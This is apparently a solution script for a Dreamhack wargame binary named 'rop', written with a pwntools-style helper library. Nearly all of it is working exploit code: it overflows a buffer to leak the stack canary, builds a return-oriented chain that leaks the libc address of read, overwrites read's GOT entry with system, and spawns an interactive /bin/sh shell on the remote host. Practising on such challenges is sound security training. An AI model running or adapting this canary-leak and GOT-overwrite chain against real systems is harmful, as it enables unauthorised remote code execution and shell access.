#!/usr/bin/python3
from pwncus import *

exe = context.binary = ELF('./rop', checksec=False)
libc = ELF('libc.so.6', checksec=False)
HOST = 'host3.dreamhack.games'
PORT = 22956
def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

p = remote(HOST, PORT) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

# [1] Leak canary
buf = b'A'*0x39
sa(b'Buf: ', buf)
ru(buf)
cnry = u64(b'\x00' + rnb(7))
slog('canary', cnry)

# [2] Exploit
read_plt = exe.plt['read']
read_got = exe.got['read']
write_plt = exe.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

sa(b'Buf: ', payload)
read = u64(rnb(6) + b'\x00'*2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

s(p64(system) + b'/bin/sh\x00')
interactive()
